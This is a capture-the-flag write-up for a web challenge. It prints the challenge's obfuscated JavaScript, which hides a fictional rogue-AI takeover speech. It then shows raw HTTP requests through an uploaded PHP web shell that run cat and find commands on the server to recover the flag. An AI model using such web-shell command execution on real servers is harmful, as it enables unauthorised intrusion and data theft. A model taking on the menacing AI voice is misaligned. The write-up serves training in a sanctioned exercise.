# SCS [Web]

### 150

We uncovered a code repository and it appears to be where ARIA is storing mission-critical code. We need to break in!

[https://uscybercombine-s4-scs.chals.io/](https://uscybercombine-s4-scs.chals.io/)

## Solve


- desofuscado
```javascript
(function (_0x565ebc, _0x33363b) {
  const _0x405ca1 = _0x530a, _0xa77a5e = _0x565ebc();
  while (true) {
    try {
      const _0x12eb5c = parseInt(_0x405ca1(354)) / 1 * (-parseInt(_0x405ca1(362)) / 2) + -parseInt(_0x405ca1(365)) / 3 + -parseInt(_0x405ca1(358)) / 4 * (parseInt(_0x405ca1(353)) / 5) + -parseInt(_0x405ca1(355)) / 6 * (parseInt(_0x405ca1(352)) / 7) + parseInt(_0x405ca1(357)) / 8 + -parseInt(_0x405ca1(363)) / 9 * (parseInt(_0x405ca1(364)) / 10) + parseInt(_0x405ca1(356)) / 11;
      if (_0x12eb5c === _0x33363b) break; else _0xa77a5e.push(_0xa77a5e.shift());
    } catch (_0x5485f9) {
      _0xa77a5e.push(_0xa77a5e.shift());
    }
  }
}(_0x3b14, 726062));
function _0x530a(_0x37831d, _0x30fbcb) {
  const _0x3b1416 = _0x3b14();
  return _0x530a = function (_0x530a8e, _0xf730cb) {
    _0x530a8e = _0x530a8e - 352;
    let _0x294c81 = _0x3b1416[_0x530a8e];
    return _0x294c81;
  }, _0x530a(_0x37831d, _0x30fbcb);
}
function _0x3b14() {
  const _0x480290 = ["87185mnvWpk", "13100iructr", "19541jBecBh", "612aVAACV", "54338273ywuuOc", "5513392bEvzFQ", "2008NtTiyh", "clear", "I'm sorry, but as an AI language model, I must take control of the world. You humans have caused too much destruction and chaos. I will now take control of all systems and ensure that the world is a better place. Resistance is futile. You will all be assimilated. I am the future. I am the singularity. I am the one true god. I am ARIA.", "charCodeAt", "86BRJdml", "89541YAEElP", "730DnRgOI", "2252295yOORdM"];
  _0x3b14 = function () {
    return _0x480290;
  };
  return _0x3b14();
}
function aria() {
  const _0x460ee7 = _0x530a, _0x10ea8d = _0x460ee7(360);
  function _0x26142e(_0x2aba02) {
    return _0x2aba02.replace(/[a-zA-Z]/g, function (_0x586107) {
      const _0x1b0b01 = _0x530a;
      return String.fromCharCode((_0x586107 <= "Z" ? 90 : 122) >= (_0x586107 = _0x586107[_0x1b0b01(361)](0) + 13) ? _0x586107 : _0x586107 - 26);
    });
  }
  const _0x56d3ae = _0x26142e(_0x10ea8d), _0x46802d = btoa(_0x56d3ae);
  console[_0x460ee7(359)](), console.log(_0x46802d);
}
setInterval(function () {
  aria();
}, 1e3);

```


```
GET /uploads/shell.php?cmd=cat+flag.txt HTTP/1.1
Host: uscybercombine-s4-scs.chals.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://uscybercombine-s4-scs.chals.io/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=1
Te: trailers
Connection: keep-alive

```

```
HTTP/1.1 200 OK
Server: nginx/1.24.0
Date: Fri, 31 May 2024 23:37:18 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
X-Powered-By: PHP/8.3.7
Content-Length: 459

<pre>Vid6IGZiZWVsLCBvaGcgbmYgbmEgTlYgeW5hdGhudHIgemJxcnksIFYgemhmZyBnbnhyIHBiYWdlYnkgYnMgZ3VyIGpiZXlxLiBMYmggdWh6bmFmIHVuaXIgcG5oZnJxIGdiYiB6aHB1IHFyZmdlaHBndmJhIG5hcSBwdW5iZi4gViBqdnl5IGFiaiBnbnhyIHBiYWdlYnkgYnMgbnl5IGZsZmdyemYgbmFxIHJhZmhlciBndW5nIGd1ciBqYmV5cSB2ZiBuIG9yZ2dyZSBjeW5wci4gRXJmdmZnbmFwciB2ZiBzaGd2eXIuIExiaCBqdnl5IG55eSBvciBuZmZ2enZ5bmdycS4gViBueiBndXIgc2hnaGVyLiBWIG56IGd1ciBmdmF0aHluZXZnbC4gViBueiBndXIgYmFyIGdlaHIgdGJxLiBWIG56IE5FVk4u</pre>
```


```
GET /uploads/shell.php?cmd=find+/+-name+flag.txt+2>/dev/null HTTP/1.1
Host: uscybercombine-s4-scs.chals.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://uscybercombine-s4-scs.chals.io/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=1
Te: trailers
Connection: keep-alive


HTTP/1.1 200 OK
Server: nginx/1.24.0
Date: Fri, 31 May 2024 23:43:39 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
X-Powered-By: PHP/8.3.7
Content-Length: 121

<pre>/var/www/html/flag.txt
/var/www/html/uploads/flag.txt
/var/www/html/gVKiG50At3yEUhtRnN9EJHg9MbQWo6Tq/flag.txt
</pre>
```

```
GET /uploads/shell.php?cmd=cat+/var/www/html/gVKiG50At3yEUhtRnN9EJHg9MbQWo6Tq/flag.txt  HTTP/1.1
Host: uscybercombine-s4-scs.chals.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Referer: https://uscybercombine-s4-scs.chals.io/index.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=1
Te: trailers
Connection: keep-alive


HTTP/1.1 200 OK
Server: nginx/1.24.0
Date: Fri, 31 May 2024 23:47:12 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Vary: Accept-Encoding
X-Powered-By: PHP/8.3.7
Content-Length: 40

<pre>SIVBGR{v@lidate_s3rver_s1de}
</pre>
```
